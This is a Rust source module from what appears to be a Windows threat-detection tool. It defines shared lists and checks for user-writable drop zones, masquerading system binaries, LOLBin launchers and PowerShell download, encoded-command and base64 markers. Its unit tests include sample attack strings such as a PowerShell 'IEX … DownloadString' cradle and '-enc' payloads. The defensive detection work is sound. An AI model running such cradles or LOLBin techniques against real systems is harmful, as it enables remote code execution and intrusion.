//! Centralized "this is normal" knowledge (spec §5b). Analyzers MUST use these
//! instead of re-deriving path/name trust locally — the whack-a-mole suppression
//! patches of S2 (TRUSTED_APPDATA, inbox-service, winlogon-default, correlation
//! matrix) all came from NOT having this module.
//!
//! It is also the single home of the detection vocabulary several analyzers share:
//! the user-writable drop-zone list, the launcher (interpreter / LOLBin) table, the exe
//! name tokenizer, the encoded-command / base64 checks and the script-marker scan.
//! Analyzers must not keep private copies of these lists — the copies drifted apart.
//!
//! Existing trust fns stay in score.rs and are re-exported here so analyzers have
//! ONE import surface: `use crate::trust::*;`.
pub use crate::score::{
    is_inbox_service_command, is_trusted_appdata_location, winlogon_value_is_default,
};

/// System-binary names an attacker plants outside C:\Windows to masquerade (S3).
/// Matched against the lowercased basename.
pub const PROTECTED_SYSTEM_NAMES: &[&str] = &[
    "svchost.exe",
    "lsass.exe",
    "csrss.exe",
    "winlogon.exe",
    "services.exe",
    "smss.exe",
    "wininit.exe",
    "explorer.exe",
    "rundll32.exe",
    "dllhost.exe",
    "taskhostw.exe",
];

/// Directories a non-admin user can write to — the drop zones. The single list every
/// analyzer uses (persist S2, ASEP target trust, event-log service/task paths,
/// process and network-owner path amplifiers). Matched case-insensitively as a path
/// substring. `\ProgramData\` counts only outside Microsoft's own subtree (see
/// [`MICROSOFT_PROGRAMDATA`]); vendor-signed per-user installs are told apart by
/// signature and [`is_trusted_appdata_location`], not by leaving AppData off this list.
pub const USER_WRITABLE_DIRS: &[&str] = &[
    r"\appdata\local\",
    r"\appdata\roaming\",
    r"\temp\",
    r"\programdata\",
    r"\users\public\",
    r"\downloads\",
];

/// The part of ProgramData that Microsoft owns and ordinary users cannot write
/// (Defender platform updates install drivers and services from here; the all-users
/// Start Menu lives here). Excluded from the `\ProgramData\` drop zone.
pub const MICROSOFT_PROGRAMDATA: &str = r"\programdata\microsoft\";

/// True if `path` (any case) contains a user-writable drop-zone segment.
pub fn is_user_writable_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    USER_WRITABLE_DIRS.iter().any(|d| {
        lower.contains(d) && !(*d == r"\programdata\" && only_microsoft_programdata(&lower))
    })
}

/// True when every `\programdata\` occurrence in `lower` is Microsoft's subtree.
fn only_microsoft_programdata(lower: &str) -> bool {
    lower
        .match_indices(r"\programdata\")
        .all(|(i, _)| lower[i..].starts_with(MICROSOFT_PROGRAMDATA))
}

/// How a launcher binary is (ab)used. One table, so every analyzer agrees on which
/// binaries are interpreters and which are proxy-execution / download tools.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LauncherKind {
    /// Command shells: cmd, PowerShell.
    Shell,
    /// Script hosts: Windows Script Host and mshta.
    ScriptHost,
    /// Signed binaries that run or load other code (LOLBins).
    ProxyExec,
    /// Tools that fetch remote content.
    Fetch,
}

/// The launcher table: exe name (lowercase, no `.exe`) and its kind.
pub const LAUNCHERS: &[(&str, LauncherKind)] = &[
    ("cmd", LauncherKind::Shell),
    ("powershell", LauncherKind::Shell),
    ("pwsh", LauncherKind::Shell),
    ("wscript", LauncherKind::ScriptHost),
    ("cscript", LauncherKind::ScriptHost),
    ("mshta", LauncherKind::ScriptHost),
    ("rundll32", LauncherKind::ProxyExec),
    ("regsvr32", LauncherKind::ProxyExec),
    ("msiexec", LauncherKind::ProxyExec),
    ("certutil", LauncherKind::ProxyExec),
    ("bitsadmin", LauncherKind::ProxyExec),
    ("conhost", LauncherKind::ProxyExec),
    ("curl", LauncherKind::Fetch),
    ("wget", LauncherKind::Fetch),
    ("finger", LauncherKind::Fetch),
];

/// The kind of launcher `exe` is (an [`exe_name`]), if it is one.
pub fn launcher_kind(exe: &str) -> Option<LauncherKind> {
    LAUNCHERS
        .iter()
        .find(|(name, _)| *name == exe)
        .map(|(_, k)| *k)
}

/// Shells and script hosts: binaries that run script text.
pub fn is_interpreter(exe: &str) -> bool {
    matches!(
        launcher_kind(exe),
        Some(LauncherKind::Shell | LauncherKind::ScriptHost)
    )
}

/// PowerShell (Windows PowerShell or PowerShell 7).
pub fn is_powershell(exe: &str) -> bool {
    exe == "powershell" || exe == "pwsh"
}

/// Normalized exe name of a path or command token: surrounding quotes and whitespace
/// stripped, last path segment, lowercased, a trailing `.exe` removed.
/// `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"` -> `powershell`.
pub fn exe_name(token: &str) -> String {
    let t = token.trim().trim_matches('"');
    let base = t
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(t)
        .to_ascii_lowercase();
    base.strip_suffix(".exe")
        .map(str::to_string)
        .unwrap_or(base)
}

/// The first token of a command line (honouring a leading quoted path with spaces)
/// and the remaining argument text.
fn split_invocation(cmd: &str) -> (&str, &str) {
    let t = cmd.trim();
    if let Some(rest) = t.strip_prefix('"') {
        match rest.find('"') {
            Some(end) => (&rest[..end], &rest[end + 1..]),
            None => (rest, ""),
        }
    } else {
        match t.find(char::is_whitespace) {
            Some(i) => (&t[..i], &t[i..]),
            None => (t, ""),
        }
    }
}

/// [`exe_name`] of the binary a command line invokes; None for an empty command.
pub fn invoked_exe(cmd: &str) -> Option<String> {
    let (first, _) = split_invocation(cmd);
    let name = exe_name(first);
    (!name.is_empty()).then_some(name)
}

/// True if the command line passes any argument after the invoked binary.
pub fn has_arguments(cmd: &str) -> bool {
    !split_invocation(cmd).1.trim().is_empty()
}

/// Every launcher named anywhere in a command line (each whitespace token is checked
/// with [`exe_name`]), in order of appearance, without duplicates. Catches the
/// `cmd.exe /c powershell ...` chain as well as the invoked binary itself.
pub fn launchers_in(cmd: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for tok in cmd.split_whitespace() {
        let name = exe_name(tok.trim_matches(|c: char| c == '(' || c == ')' || c == ';'));
        if launcher_kind(&name).is_some() && !out.contains(&name) {
            out.push(name);
        }
    }
    out
}

/// True if the command line carries a PowerShell encoded-command flag:
/// `-EncodedCommand` or any prefix of it from `-enc` up, `-ec`, and — only when
/// `is_powershell` — the bare `-e` short form (other tools use `-e` for unrelated
/// things). Token-based: `--encoding` or `-encrypt` do not count.
pub fn has_encoded_flag(cmd: &str, is_powershell: bool) -> bool {
    cmd.split_whitespace().any(|tok| {
        let Some(flag) = tok.strip_prefix('-') else {
            return false;
        };
        let flag = flag.to_ascii_lowercase();
        (flag.len() >= 3 && "encodedcommand".starts_with(&flag))
            || flag == "ec"
            || (is_powershell && flag == "e")
    })
}

/// True if `s` contains a token that really looks like base64 data: a run of the
/// base64 alphabet at least 20 long, whose length is a multiple of 4 or which ends in
/// `=` padding, that mixes upper and lower case and contains a digit or `+`/`/`.
/// Plain words and paths (`WindowsPowerShell`, `ProgramFilesX86`) do not qualify.
pub fn has_base64_token(s: &str) -> bool {
    s.split(|c: char| !(c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='))
        .any(is_base64_like)
}

fn is_base64_like(tok: &str) -> bool {
    let len = tok.len();
    len >= 20
        && (len.is_multiple_of(4) || tok.ends_with('='))
        && tok.bytes().any(|b| b.is_ascii_uppercase())
        && tok.bytes().any(|b| b.is_ascii_lowercase())
        && tok
            .bytes()
            .any(|b| b.is_ascii_digit() || b == b'+' || b == b'/')
}

/// What a script marker indicates.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MarkerKind {
    /// Encoded / obfuscated payload (`-EncodedCommand`, `FromBase64String`).
    Encoded,
    /// A remote URL.
    Remote,
    /// A download primitive (`DownloadString`, `Invoke-WebRequest`, BITS).
    Download,
    /// Dynamic execution of a string (`Invoke-Expression` / `iex`).
    Exec,
}

/// One payload marker found in a command or script body.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ScriptMarker {
    pub label: &'static str,
    pub kind: MarkerKind,
}

/// How a marker is detected: a substring of the lowercased text, or the
/// token-based encoded-command flag ([`has_encoded_flag`]).
enum Needle {
    Sub(&'static str),
    EncodedFlag,
}

/// Markers in reporting order, with what each one means.
const MARKERS: &[(Needle, &str, MarkerKind)] = &[
    (
        Needle::Sub("downloadstring"),
        "DownloadString",
        MarkerKind::Download,
    ),
    (
        Needle::Sub("downloadfile"),
        "DownloadFile",
        MarkerKind::Download,
    ),
    (
        Needle::Sub("invoke-webrequest"),
        "Invoke-WebRequest",
        MarkerKind::Download,
    ),
    (Needle::Sub("iwr "), "iwr", MarkerKind::Download),
    (
        Needle::Sub("invoke-expression"),
        "Invoke-Expression",
        MarkerKind::Exec,
    ),
    (Needle::Sub("iex "), "iex", MarkerKind::Exec),
    (Needle::Sub("iex("), "iex", MarkerKind::Exec),
    (
        Needle::Sub("frombase64string"),
        "FromBase64String",
        MarkerKind::Encoded,
    ),
    (Needle::EncodedFlag, "-EncodedCommand", MarkerKind::Encoded),
    (
        Needle::Sub("start-bitstransfer"),
        "Start-BitsTransfer",
        MarkerKind::Download,
    ),
    (Needle::Sub("http://"), "http URL", MarkerKind::Remote),
    (Needle::Sub("https://"), "https URL", MarkerKind::Remote),
];

/// Download / encoded-payload / remote markers in a command line or script body. The
/// one marker scan shared by persistence (S9 script persistence, PowerShell profiles),
/// event-log service/task commands and ClickFix Run-dialog entries. Labels are
/// de-duplicated, in table order.
pub fn script_markers(text: &str) -> Vec<ScriptMarker> {
    let lower = text.to_ascii_lowercase();
    let mut found: Vec<ScriptMarker> = Vec::new();
    for (needle, label, kind) in MARKERS {
        let hit = match needle {
            Needle::Sub(n) => lower.contains(n),
            Needle::EncodedFlag => has_encoded_flag(text, false),
        };
        if hit && !found.iter().any(|m| m.label == *label) {
            found.push(ScriptMarker { label, kind: *kind });
        }
    }
    found
}

/// Just the labels of [`script_markers`], for reason text.
pub fn script_marker_labels(text: &str) -> Vec<&'static str> {
    script_markers(text).into_iter().map(|m| m.label).collect()
}

/// True if `path` is an absolute path under the Windows tree on ANY drive
/// (`X:\Windows\...`). Covers System32 / SysWOW64 / WinSxS / the Windows root —
/// all locations where system-named binaries legitimately live (explorer.exe sits
/// in C:\Windows directly, not System32).
pub fn is_under_windows_tree(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    // position 1 == drive-colon form "x:\windows\"
    lower
        .get(1..)
        .is_some_and(|rest| rest.starts_with(r":\windows\"))
}

/// True if `path` is under the Windows tree or Program Files (either bitness).
/// Both require admin to write — "system or vendor-installed" trust tier (S4 gate).
pub fn is_system_or_program_files(path: &str) -> bool {
    if is_under_windows_tree(path) {
        return true;
    }
    let lower = path.to_ascii_lowercase();
    lower
        .get(1..)
        .is_some_and(|rest| rest.starts_with(r":\program files"))
}

/// S3: a protected system name at an ABSOLUTE path outside the Windows tree.
/// Relative/bare paths return false — no location info means no masquerade verdict
/// (honest abstain; the winlogon default `explorer.exe` is a bare name).
pub fn is_masquerade(path: &str) -> bool {
    if !path.get(1..).is_some_and(|r| r.starts_with(":\\")) {
        return false; // not absolute — abstain
    }
    if is_under_windows_tree(path) {
        return false;
    }
    let base = path
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    PROTECTED_SYSTEM_NAMES.contains(&base.as_str())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn user_writable_covers_every_drop_zone() {
        for p in [
            r"C:\Users\a\AppData\Roaming\evil.exe",
            r"C:\Users\a\AppData\Local\Temp\evil.exe",
            r"C:\Users\a\AppData\Local\Vendor\x.exe",
            r"C:\Windows\Temp\x.exe",
            r"C:\Users\a\Downloads\x.exe",
            r"C:\ProgramData\x\evil.exe",
            r"C:\Users\Public\x.exe",
            r"c:\users\public\documents\X.EXE",
        ] {
            assert!(is_user_writable_path(p), "{p}");
        }
        for p in [
            r"C:\Program Files\X\x.exe",
            r"C:\Windows\System32\cmd.exe",
            r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe",
            r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\a.lnk",
            r"C:\Tools\public.exe",
        ] {
            assert!(!is_user_writable_path(p), "{p}");
        }
    }

    #[test]
    fn exe_name_and_invoked_exe_normalize_tokens() {
        assert_eq!(
            exe_name(r#""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""#),
            "powershell"
        );
        assert_eq!(exe_name("CMD.EXE"), "cmd");
        assert_eq!(exe_name("mshta"), "mshta");
        assert_eq!(
            invoked_exe(r#""C:\Program Files\PowerShell\7\pwsh.exe" -NoP -c x"#).as_deref(),
            Some("pwsh")
        );
        assert_eq!(
            invoked_exe(r"C:\Program Files\PowerShell Studio\app.exe --serve").as_deref(),
            Some("program"),
            "unquoted spaced path: the first token is not the interpreter"
        );
        assert_eq!(invoked_exe("   "), None);
        assert!(has_arguments("cmd /c whoami"));
        assert!(!has_arguments(r#""C:\x\cmd.exe""#));
    }

    #[test]
    fn launcher_table_classifies_once_for_every_analyzer() {
        assert!(is_interpreter("cmd") && is_interpreter("mshta") && is_interpreter("pwsh"));
        assert!(!is_interpreter("rundll32"));
        assert_eq!(launcher_kind("certutil"), Some(LauncherKind::ProxyExec));
        assert_eq!(launcher_kind("curl"), Some(LauncherKind::Fetch));
        assert_eq!(launcher_kind("notepad"), None);
        assert_eq!(
            launchers_in(r#"cmd.exe /c "powershell -nop -c iex(x)""#),
            vec!["cmd".to_string(), "powershell".to_string()]
        );
        assert!(launchers_in(r"C:\Program Files\WindowsPowerShell\Modules\x.exe").is_empty());
    }

    #[test]
    fn encoded_flag_is_token_based() {
        assert!(has_encoded_flag("powershell -enc SQBF", false));
        assert!(has_encoded_flag("powershell -EncodedCommand SQBF", false));
        assert!(has_encoded_flag("pwsh -ec SQBF", false));
        assert!(has_encoded_flag("powershell -e SQBF", true));
        assert!(
            !has_encoded_flag("curl -e SQBF", false),
            "-e only for PowerShell"
        );
        assert!(!has_encoded_flag("tool --encoding utf8", false));
        assert!(!has_encoded_flag("tool -encrypt", false));
    }

    #[test]
    fn base64_token_needs_real_base64_shape() {
        assert!(has_base64_token(
            "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"
        ));
        assert!(has_base64_token("x aGVsbG8gd29ybGQgZnJvbSBjYWlybg=="));
        // Regression: the old any-16-alnum-run check fired on the PowerShell path.
        assert!(!has_base64_token(
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File x.ps1"
        ));
        assert!(!has_base64_token("WindowsPowerShellModuleCache")); // no digit, len 28
        assert!(!has_base64_token("abcdefghijklmnopqrstuvwx1234")); // single case
        assert!(!has_base64_token("SQBFAFgA")); // too short
    }

    #[test]
    fn script_markers_kinds_and_labels() {
        let m = script_markers("IEX (New-Object Net.WebClient).DownloadString('http://x/a')");
        let labels: Vec<_> = m.iter().map(|m| m.label).collect();
        assert!(labels.contains(&"DownloadString"));
        assert!(labels.contains(&"iex"));
        assert!(labels.contains(&"http URL"));
        assert!(m.iter().any(|m| m.kind == MarkerKind::Remote));
        let enc = script_markers("powershell.exe -NoP -Enc SQBFAFgA");
        assert_eq!(enc.len(), 1);
        assert_eq!(enc[0].kind, MarkerKind::Encoded);
        assert!(script_markers(r"wscript.exe C:\Scripts\backup.vbs").is_empty());
    }

    #[test]
    fn windows_tree_covers_root_system32_syswow64_any_drive() {
        assert!(is_under_windows_tree(r"C:\Windows\explorer.exe"));
        assert!(is_under_windows_tree(r"C:\WINDOWS\System32\svchost.exe"));
        assert!(is_under_windows_tree(r"D:\Windows\SysWOW64\svchost.exe"));
        assert!(!is_under_windows_tree(r"C:\Windows2\evil.exe"));
        assert!(!is_under_windows_tree("explorer.exe")); // relative — not under tree
    }

    #[test]
    fn system_or_pf_includes_both_program_files() {
        assert!(is_system_or_program_files(r"C:\Program Files\V\v.exe"));
        assert!(is_system_or_program_files(
            r"C:\Program Files (x86)\V\v.exe"
        ));
        assert!(is_system_or_program_files(r"C:\Windows\System32\a.exe"));
        assert!(!is_system_or_program_files(
            r"C:\Users\a\AppData\Local\P\p.exe"
        ));
    }

    #[test]
    fn masquerade_fires_only_on_absolute_paths_outside_windows() {
        assert!(is_masquerade(r"C:\Users\a\AppData\Roaming\svchost.exe"));
        assert!(is_masquerade(r"C:\ProgramData\lsass.exe"));
        assert!(!is_masquerade(r"C:\Windows\System32\svchost.exe"));
        assert!(!is_masquerade(r"C:\Windows\explorer.exe"));
        assert!(!is_masquerade("explorer.exe")); // bare name — abstain
        assert!(!is_masquerade(r"C:\Users\a\AppData\Roaming\notmalware.exe")); // not protected name
    }
}
